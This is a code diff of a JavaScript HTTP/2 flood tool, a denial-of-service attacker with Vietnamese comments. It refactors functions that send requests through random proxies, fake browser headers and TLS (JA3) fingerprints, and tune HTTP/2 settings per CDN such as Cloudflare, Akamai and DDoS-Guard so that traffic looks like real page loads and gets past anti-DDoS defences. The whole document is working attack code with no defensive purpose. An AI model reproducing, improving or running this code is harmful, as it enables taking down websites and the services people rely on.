-        "US": ["en-US,en;q=0.9", "en-US,en;q=0.8,es;q=0.7", "en-US,en-GB;q=0.9", "en-US,en;q=0.8,fr;q=0.7"],
-        "VN": ["vi-VN,vi;q=0.9,en-US;q=0.8", "vi-VN,vi;q=0.9,en;q=0.7", "vi,en-US;q=0.9", "vi-VN,vi;q=0.8"],
-        "JP": ["ja-JP,ja;q=0.9,en-US;q=0.8", "ja-JP,ja;q=0.8,en;q=0.7", "ja,en-US;q=0.9"],
-        "DE": ["de-DE,de;q=0.9,en-US;q=0.8", "de-DE,de;q=0.8,en;q=0.7", "de,en-US;q=0.9"],
-        "FR": ["fr-FR,fr;q=0.9,en-US;q=0.8", "fr-FR,fr;q=0.8,en;q=0.7", "fr,en-US;q=0.9"],
-    };
-    const defaultAcceptLanguage = ["en-US,en;q=0.9", "en-US,en;q=0.8", "en,en-GB;q=0.9"];
-    const acceptLanguage = randomElement(acceptLanguagesMap[geoCountryCode] || defaultAcceptLanguage);
-
-    const secFetchSite = randomElement(profile.secFetchSites);
-    let referer = undefined;
-    let origin = undefined;
-
-    if (secFetchSite === "same-origin" || secFetchSite === "same-site") {
-        referer = `https://${parsedTarget.host}/`;
-        origin = `https://${parsedTarget.host}`;
-    } else if (secFetchSite === "cross-site") {
-        referer = randomElement(referers);
-        origin = randomElement(origins);
-    }
-
-    const chromiumBased = ["chrome", "edge", "brave", "opera", "operagx", "duckduckgo", "mobile-chrome"];
-    const secChUa = chromiumBased.includes(browser) ?
-        `"${browser === "chrome" || browser === "mobile-chrome" ? "Google Chrome" : browser === "edge" ? "Microsoft Edge" : browser === "brave" ? "Brave" : "Opera"}";v="${version}", "Chromium";v="${version}", "Not-A.Brand";v="99"` :
-        undefined;
-
-    const platformVersions = {
-        "Windows": "10.0.0",
-        "macOS": "12.6.0",
-        "Linux": "5.15.0",
-        "Android": "12.0",
-        "iOS": "15.6",
-    };
-
-    const headersArray = [
-        [":method", "GET"],
-        [":authority", Math.random() < 0.5 ? parsedTarget.host : `www.${parsedTarget.host}`],
-        [":scheme", "https"],
-        [":path", parsedTarget.path || "/"],
-        ["user-agent", uapick(browser, version, platform, isMobile, fullVersion)],
-        ...(secChUa ? [["sec-ch-ua", secChUa]] : []),
-        ["sec-ch-ua-mobile", isMobile ? "?1" : "?0"],
-        ["sec-ch-ua-platform", `"${platform}"`],
-        ...(secChUa ? [["sec-ch-ua-full-version-list", `"${browser.replace("mobile-", "")}";v="${fullVersion}", "Not-A.Brand";v="99.0.0.0"`]] : []),
-        ["sec-ch-ua-platform-version", platformVersions[platform] || "10.0.0"],
-        ["sec-ch-dpr", Math.random() < 0.5 ? "1.0" : "2.0"],
-        ["accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],
-        ["sec-fetch-site", secFetchSite],
-        ["sec-fetch-mode", randomElement(profile.secFetchModes)],
-        ["sec-fetch-user", Math.random() < 0.8 ? "?1" : undefined],
-        ["sec-fetch-dest", randomElement(profile.secFetchDests)],
-        ["referer", referer || "https://www.google.com/"],
-        ["accept-encoding", randomElement(profile.acceptEncodings)],
-        ["accept-language", acceptLanguage],
-        ["upgrade-insecure-requests", Math.random() < 0.9 ? "1" : undefined],
-        ["cache-control", randomElement(profile.cacheControls)],
-        ["priority", randomElement(["u=0, i", "u=1", "u=2", "u=3", "u=4"])],
-        ...(Math.random() < 0.5 ? [["x-request-id", `${randstr(8)}-${randstr(4)}-${randstr(4)}-${randstr(12)}`]] : []),
-        ...(Math.random() < 0.4 ? [["x-session-token", `${randstr(16)}`]] : []),
-    ];
-
-    const baseHeaders = headersArrayToObject(headersArray);
-    const specificHeaders = profile.getSpecificHeaders(browser, version, platform, isMobile, fullVersion);
-    Object.assign(baseHeaders, specificHeaders);
-
-    if (referer) baseHeaders["referer"] = referer;
-    if (origin) baseHeaders["origin"] = origin;
-
-    Object.keys(baseHeaders).forEach(key => baseHeaders[key] === undefined && delete baseHeaders[key]);
-
-    return baseHeaders;
-};
-
-function taoDoiTuongNgauNhien() {
-    const doiTuong = {};
-    const maxi = getRandomInt(2, 3);
-    for (let i = 1; i <= maxi; i++) {
-        const key = 'cf-sec-' + generateRandomString(1, 9);
-        const value = generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12);
-        doiTuong[key] = value;
-    }
-    return doiTuong;
-}
-
+// --- BỘ QUẢN LÝ PHIÊN ---
 class SessionManager {
-    constructor() {
-        this.cookies = {};
-        this.cacheHeaders = {};
-    }
-
-    addCookies(host, setCookieHeaders) {
-        if (!this.cookies[host]) {
-            this.cookies[host] = {};
-        }
-        setCookieHeaders.forEach(cookieStr => {
-            try {
-                const parts = cookieStr.split(';')[0].split('=');
-                if (parts.length >= 2) {
-                    this.cookies[host][parts[0].trim()] = parts.slice(1).join('=').trim();
-                }
-            } catch (e) {
-            }
-        });
-    }
-
-    getCookieHeader(host) {
-        if (this.cookies[host]) {
-            const cookieString = Object.entries(this.cookies[host]).map(([name, value]) => `${name}=${value}`).join('; ');
-            return cookieString || null;
-        }
-        return null;
-    }
-
-    addCacheHeaders(path, etag, lastModified) {
-        this.cacheHeaders[path] = { etag, lastModified };
-    }
-
-    getCacheHeaders(path) {
-        return this.cacheHeaders[path];
-    }
+    constructor() { this.cookies = {}; this.cache = new Map(); }
+    addCookies(setCookieHeaders) { if (!setCookieHeaders) return; (Array.isArray(setCookieHeaders) ? setCookieHeaders : [setCookieHeaders]).forEach(c => { try { const p = c.split(';')[0].split('='); if (p.length >= 2) this.cookies[p[0].trim()] = p.slice(1).join('=').trim(); } catch {} }); }
+    getCookieHeader() { const e = Object.entries(this.cookies); return e.length ? e.map(([n, v]) => `${n}=${v}`).join('; ') : null; }
+    updateCache(path, headers) { const { etag, 'last-modified': lastModified } = headers; if (etag || lastModified) this.cache.set(path, { etag, lastModified }); }
+    getCacheHeaders(path) { const c = this.cache.get(path), h = {}; if (c) { if (c.etag) h['if-none-match'] = c.etag; if (c.lastModified) h['if-modified-since'] = c.lastModified; } return h; }
 }
 
-
-function runFlooder() {
-    let sessionCounter = 0;
-    const proxyAddr = randomElement(proxies);
-    const parsedProxy = proxyAddr.split(":");
-    const parsedPort = parsedTarget.protocol === "https:" ? "443" : "80";
-    const clength = randomElement(urihost);
-
-    let browser = getRandomBrowser();
-    let browserProfile = BROWSER_PROFILES[browser];
-    if (typeof browserProfile === 'string') {
-        browserProfile = BROWSER_PROFILES[browserProfile];
-    }
-
-    let version = Math.floor(Math.random() * (browserProfile.versions.max - browserProfile.versions.min + 1)) + browserProfile.versions.min;
-    let platform = randomElement(browserProfile.platforms);
-    const isMobile = browser.includes("mobile");
-    let fullVersion = `${version}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 200)}`;
-
-    const isp = "Cloudflare, Inc."; // ISP cố định
-    let baseHeaders = headerFunc(parsedTarget, browser, version, platform, isMobile, fullVersion, geoCountryCode);
-
-    let ja3Profile = JA3_PROFILES[browser];
-    if (typeof BROWSER_PROFILES[browser] === 'string') {
-        ja3Profile = JA3_PROFILES[BROWSER_PROFILES[browser]];
-    }
-    if (!ja3Profile) {
-        ja3Profile = {
-            ciphers: ciphers,
-            sigalgs: SignalsList,
-            ecdhCurve: ecdhCurve,
-            secureProtocol: ['TLSv1.3_method', 'TLSv1.2_method'],
-        };
-    }
-
-    const proxyOptions = {
-        host: parsedProxy[0],
-        port: ~~parsedProxy[1],
-        address: `${parsedTarget.host}:443`,
-        timeout: 10
-    };
-
-    Socker.HTTP(proxyOptions, async (connection, error) => {
-        if (error) return;
-        connection.setKeepAlive(true, 600000);
-        connection.setNoDelay(true);
-
-        const tlsOptions = {
-            secure: true,
-            ALPNProtocols: ["h2", "http/1.1"],
-            ciphers: ja3Profile.ciphers,
-            requestCert: true,
-            sigalgs: ja3Profile.sigalgs,
-            socket: connection,
-            ecdhCurve: ja3Profile.ecdhCurve,
-            honorCipherOrder: true,
-            rejectUnauthorized: false,
-            secureProtocol: randomElement(ja3Profile.secureProtocol),
-            secureOptions: secureOptions,
-            host: parsedTarget.host,
-            servername: parsedTarget.host,
-        };
-
-        const dynamicSecureContext = tls.createSecureContext({
-            ciphers: tlsOptions.ciphers,
-            sigalgs: tlsOptions.sigalgs,
-            honorCipherOrder: tlsOptions.honorCipherOrder,
-            secureOptions: tlsOptions.secureOptions,
-            secureProtocol: tlsOptions.secureProtocol
-        });
-        tlsOptions.secureContext = dynamicSecureContext;
-
-        const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
-
-        tlsSocket.allowHalfOpen = true;
-        tlsSocket.setNoDelay(true);
-        tlsSocket.setKeepAlive(true, 60000);
-        tlsSocket.setMaxListeners(0);
-
-        function generateJA3Fingerprint(socket) {
-            const cipherInfo = socket.getCipher();
-            const supportedVersions = socket.getProtocol();
-            if (!cipherInfo) {
-                return null;
-            }
-            const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
-            const md5Hash = crypto.createHash('md5');
-            md5Hash.update(ja3String);
-            return md5Hash.digest('hex');
-        }
-
-        tlsSocket.on('connect', () => {
-            const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
-        });
-
-        function randomElement(array) {
-    return array[Math.floor(Math.random() * array.length)];
-}
-
+// --- HÀM LẤY CÀI ĐẶT HTTP/2 ---
 function getSettingsBasedOnISP(isp) {
-    const defaultSettings = {
-        headerTableSize: 65536,
-        initialWindowSize: Math.random() < 0.5 ? 6291456 : 33554432,
-        maxHeaderListSize: 262144,
-        enablePush: false,
-        maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
-        maxFrameSize: 16384,
-        enableConnectProtocol: false,
+    const defaultSettings = { headerTableSize: 65536, initialWindowSize: Math.random() < 0.5 ? 6291456 : 33554332, maxHeaderListSize: 262144, enablePush: false, maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000, maxFrameSize: 16384, enableConnectProtocol: false };
+    const microsoftVnIspSettings = { headerTableSize: 4096, initialWindowSize: 8388608, maxConcurrentStreams: 100 };
+    const ispSettingsMap = {
+        'Cloudflare': { initialWindowSize: 65536, enableConnectProtocol: false }, 'OVH': { headerTableSize: 4096, initialWindowSize: 65536, maxFrameSize: 16777215, maxConcurrentStreams: 128 },
+        'Akamai': { headerTableSize: 4096, maxConcurrentStreams: 100, initialWindowSize: 6291456, maxHeaderListSize: 32768 }, 'Fastly': { headerTableSize: 4096, initialWindowSize: 65535, maxConcurrentStreams: 100 },
+        'Amazon': { maxConcurrentStreams: 100, initialWindowSize: 65535 }, 'Google': { headerTableSize: 4096, initialWindowSize: 1048576, maxConcurrentStreams: 100, maxHeaderListSize: 137216 },
+        'Microsoft': microsoftVnIspSettings, 'VIETNIX': microsoftVnIspSettings, 'VNPT': microsoftVnIspSettings, 'Hetzner': { maxConcurrentStreams: 150, initialWindowSize: 1048576 },
     };
-
-    const settings = { ...defaultSettings };
-
-    if (isp === 'Cloudflare, Inc.') {
-        settings.maxConcurrentStreams = Math.random() < 0.5 ? 100 : 1000;
-        settings.initialWindowSize = 65536;
-        settings.maxFrameSize = 16384;
-        settings.enableConnectProtocol = false;
-    } else if (['FDCservers.net', 'OVH SAS', 'VNXCLOUD'].includes(isp)) {
-        settings.headerTableSize = 4096;
-        settings.initialWindowSize = 65536;
-        settings.maxFrameSize = 16777215;
-        settings.maxConcurrentStreams = 128;
-        settings.maxHeaderListSize = 4294967295;
-    } else if (['Akamai Technologies, Inc.', 'Akamai International B.V.'].includes(isp)) {
-        settings.headerTableSize = 4096;
-        settings.maxConcurrentStreams = 100;
-        settings.initialWindowSize = 6291456;
-        settings.maxFrameSize = 16384;
-        settings.maxHeaderListSize = 32768;
-    } else if (['Fastly, Inc.', 'Optitrust GmbH'].includes(isp)) {
-        settings.headerTableSize = 4096;
-        settings.initialWindowSize = 65535;
-        settings.maxFrameSize = 16384;
-        settings.maxConcurrentStreams = 100;
-        settings.maxHeaderListSize = 4294967295;
-    } else if (isp === 'Ddos-guard LTD') {
-        settings.maxConcurrentStreams = 8;
-        settings.initialWindowSize = 65535;
-        settings.maxFrameSize = 16777215;
-        settings.maxHeaderListSize = 262144;
-    } else if (['Amazon.com, Inc.', 'Amazon Technologies Inc.'].includes(isp)) {
-        settings.maxConcurrentStreams = 100;
-        settings.initialWindowSize = 65535;
-        settings.maxHeaderListSize = 262144;
-    } else if (['Microsoft Corporation', 'Vietnam Posts and Telecommunications Group', 'VIETNIX'].includes(isp)) {
-        settings.headerTableSize = 4096;
-        settings.initialWindowSize = 8388608;
-        settings.maxFrameSize = 16384;
-        settings.maxConcurrentStreams = 100;
-        settings.maxHeaderListSize = 4294967295;
-    } else if (isp === 'Google LLC') {
-        settings.headerTableSize = 4096;
-        settings.initialWindowSize = 1048576;
-        settings.maxFrameSize = 16384;
-        settings.maxConcurrentStreams = 100;
-        settings.maxHeaderListSize = 137216;
-    } else {
-        settings.headerTableSize = 65535;
-        settings.maxConcurrentStreams = 1000;
-        settings.initialWindowSize = 6291456;
-        settings.maxHeaderListSize = 261144;
-        settings.maxFrameSize = 16384;
-    }
-
-    return settings;
+    for (const key in ispSettingsMap) { if (isp.includes(key)) return { ...defaultSettings, ...ispSettingsMap[key] }; }
+    return defaultSettings;
 }
 
-        let hpack = new HPACK();
-        let client;
-        const clients = [];
-        client = http2.connect(parsedTarget.href, {
-            protocol: "https",
-            createConnection: () => tlsSocket,
-            settings: getSettingsBasedOnISP(isp),
-            socket: tlsSocket,
-        });
-        clients.push(client);
-        client.setMaxListeners(0);
+// --- LOGIC CHÍNH ---
+function runFlooder() {
+    const proxyAddr = randomElement(proxies);
+    const [host, port] = proxyAddr.split(":");
+    const proxyOptions = { host, port: parseInt(port), address: parsedTarget.host, timeout: 15 };
+    const identity = createIdentity();
 
-        const updateWindow = Buffer.alloc(4);
-        updateWindow.writeUInt32BE(15663105, 0); // Giá trị cố định
-        client.on('remoteSettings', (settings) => {
-            client.setLocalWindowSize(15663105, 0); // Giá trị cố định
-        });
+    Socker.HTTP(proxyOptions, (connection, error) => {
+        if (error) return;
+        const tlsOptions = { secure: true, ALPNProtocols: ["h2"], ciphers: identity.ja3Profile.ciphers, sigalgs: identity.ja3Profile.sigalgs, socket: connection, ecdhCurve: identity.ja3Profile.ecdhCurve, honorCipherOrder: true, rejectUnauthorized: false, secureProtocol: randomElement(identity.ja3Profile.secureProtocol), secureOptions, servername: parsedTarget.host };
+        const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions);
+        const client = http2.connect(parsedTarget.href, { createConnection: () => tlsSocket, settings: getSettingsBasedOnISP(isp) });
+        const session = new SessionManager();
+        
+        const handleResponse = (headers, path) => {
+            const statusCode = headers[':status'];
+            // **UPDATED**: Gửi status code về cho master process
+            if (statusCode && process.send) {
+                process.send({ statusCode });
+            }
+            session.addCookies(headers['set-cookie']);
+            session.updateCache(path, headers);
+        };
 
-        client.on('connect', () => {
-            client.ping((err, duration, payload) => {});
-            client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('Client Hello'));
-        });
+        async function simulatePageLoad(path, referer) {
+            if (tlsSocket.destroyed) return;
+            const docHeaders = { ...identity.baseHeaders, ":method": "GET", ":authority": parsedTarget.host, ":scheme": "https", ":path": path, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "sec-fetch-site": referer ? "same-origin" : "cross-site", "sec-fetch-mode": "navigate", "sec-fetch-dest": "document", "referer": referer || randomElement(referers), ...session.getCacheHeaders(path) };
+            const cookie = session.getCookieHeader(); if (cookie) docHeaders.cookie = cookie;
+            const docReq = client.request(docHeaders);
+            docReq.on('response', (headers) => handleResponse(headers, path));
+            docReq.end();
+            await new Promise(resolve => setTimeout(resolve, randomIntn(100, 300)));
+            
+            const subResources = resourcePaths.slice(0, randomIntn(1, resourcePaths.length));
+            for (const r of subResources) {
+                if (tlsSocket.destroyed) break;
+                const resHeaders = { ...identity.baseHeaders, ":method": "GET", ":authority": parsedTarget.host, ":scheme": "https", ":path": r.path, "accept": r.accept, "sec-fetch-site": "same-origin", "sec-fetch-mode": "no-cors", "sec-fetch-dest": r.dest, "referer": `${parsedTarget.protocol}//${parsedTarget.host}${path}`, ...session.getCacheHeaders(r.path) };
+                const cookie = session.getCookieHeader(); if (cookie) resHeaders.cookie = cookie;
+                const resReq = client.request(resHeaders);
+                // **UPDATED**: Ghi nhận status code cho cả tài nguyên phụ
+                resReq.on('response', (headers) => handleResponse(headers, r.path));
+                resReq.end();
+            }
+        }
 
-        const sessionManager = new SessionManager();
-
-        clients.forEach(client => {
-            const intervalId = setInterval(() => {
-                async function sendRequests() {
-                    const orderedResources = [
-                        { path: "/", dest: "document" },
-                        ...resourcePaths.filter(r => r.dest === "style"),
-                        ...resourcePaths.filter(r => r.dest === "script"),
-                        ...resourcePaths.filter(r => r.dest === "image"),
-                    ];
-
-                    sessionCounter++;
-                    if (sessionCounter % 5 === 0) {
-                        browser = getRandomBrowser();
-                        browserProfile = BROWSER_PROFILES[browser];
-                        if (typeof browserProfile === 'string') {
-                            browserProfile = BROWSER_PROFILES[browserProfile];
-                        }
-                        version = Math.floor(Math.random() * (browserProfile.versions.max - browserProfile.versions.min + 1)) + browserProfile.versions.min;
-                        platform = randomElement(browserProfile.platforms);
-                        fullVersion = `${version}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 200)}`;
-                        baseHeaders = headerFunc(parsedTarget, browser, version, platform, isMobile, fullVersion, geoCountryCode);
-                    }
-
-                    if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
-                        for (let i = 0; i < args.Rate; i++) {
-                            const requestPromise = new Promise(async (resolve, reject) => {
-                                const resource = orderedResources[i % orderedResources.length];
-                                const selectedPath = resource.path;
-                                const secFetchDest = resource.dest;
-                                const method = "GET";
-
-                                const resourceSpecificHeaders = {
-                                    "style": { "accept": "text/css,*/*;q=0.1", "sec-fetch-dest": "style" },
-                                    "script": { "accept": "*/*", "sec-fetch-dest": "script" },
-                                    "image": { "accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8", "sec-fetch-dest": "image" },
-                                };
-
-                                const dynamicHeaders = {
-                                    ...(Math.random() < 0.6 ? { 'x-forwarded-for': `${randstr(10)}:${randstr(10)}` } : {}),
-                                    ...(Math.random() < 0.9 ? { "referer": "https://" + clength } : {}),
-                                    ...(Math.random() < 0.9 ? {
-                                        "origin": Math.random() < 0.5 ?
-                                            "https://" + clength + "/" :
-                                            "https://root-admin." + clength
-                                    } : {}),
-                                    ...(Math.random() < 0.7 ? { ['cf-sec-with-from-' + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) } : {}),
-                                    ...(Math.random() < 0.7 ? { ['user-x-with-' + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) } : {}),
-                                    "RTT": randomElement(["50", "100", "150", "200"]),
-                                    ...(Math.random() < 0.7 ? taoDoiTuongNgauNhien() : {}),
-                                };
-
-                                const finalHeaders = {
-                                    ...baseHeaders,
-                                    ":method": method,
-                                    ":path": selectedPath,
-                                    "sec-fetch-dest": secFetchDest,
-                                    ...(resourceSpecificHeaders[secFetchDest] || {}),
-                                    ...dynamicHeaders,
-                                };
-
-                                const cookieHeader = sessionManager.getCookieHeader(parsedTarget.host);
-                                if (cookieHeader) {
-                                    finalHeaders['cookie'] = cookieHeader;
-                                }
-
-                                const cachedInfo = sessionManager.getCacheHeaders(selectedPath);
-                                if (cachedInfo) {
-                                    if (cachedInfo.etag) {
-                                        finalHeaders['if-none-match'] = cachedInfo.etag;
-                                    }
-                                    if (cachedInfo.lastModified) {
-                                        finalHeaders['if-modified-since'] = cachedInfo.lastModified;
-                                    }
-                                }
-
-                                Object.keys(finalHeaders).forEach(key => finalHeaders[key] === undefined && delete finalHeaders[key]);
-
-                                const req = client.request(finalHeaders, {
-                                    weight: randomElement([200, 231, 251]),
-                                    depends_on: 0,
-                                    exclusive: Math.random() < 0.5 ? true : false,
-                                })
-                                .on('response', response => {
-                                    const setCookie = response['set-cookie'];
-                                    if (setCookie) {
-                                        sessionManager.addCookies(parsedTarget.host, Array.isArray(setCookie) ? setCookie : [setCookie]);
-                                    }
-
-                                    const etag = response['etag'];
-                                    const lastModified = response['last-modified'];
-                                    if (etag || lastModified) {
-                                        sessionManager.addCacheHeaders(selectedPath, etag, lastModified);
-                                    }
-
-                                    req.close(http2.constants.NO_ERROR);
-                                    req.destroy();
-                                    resolve();
-                                })
-                                .on('error', (err) => {
-                                    reject(err);
-                                });
-
-                                req.on('end', () => {
-                                    resolve();
-                                });
-
-                                req.end();
-                                await new Promise(resolve => setTimeout(resolve, 500 + (Math.random() * 100 - 50))); // Độ trễ 450-550ms
-                            });
-                            await requestPromise.catch(() => {});
-                        }
-                    }
-                }
-
-                sendRequests();
-            }, 500); // Độ trễ cố định 500ms
+        client.on('connect', async () => {
+            for (let i = 0; i < args.Rate; i++) {
+                if (tlsSocket.destroyed) break;
+                await simulatePageLoad(parsedTarget.path, i > 0 ? `${parsedTarget.protocol}//${parsedTarget.host}${parsedTarget.path}` : null);
+                await new Promise(resolve => setTimeout(resolve, randomIntn(1000, 3000)));
+            }
+            client.destroy(); connection.destroy();
         });
 
-        client.on("close", () => {
-            client.destroy();
-            tlsSocket.destroy();
-            connection.destroy();
-            return runFlooder();
-        });
-
-        client.on("error", error => {
-            client.destroy();
-            connection.destroy();
-            return runFlooder();
-        });
+        client.on("error", () => { client.destroy(); connection.destroy(); });
+        client.on("close", () => { client.destroy(); connection.destroy(); });
     });
 }
-
-const StopScript = () => process.exit(1);
-setTimeout(StopScript, args.time * 1000);
-
-process.on('uncaughtException', error => {});
-process.on('unhandledRejection', error => {});
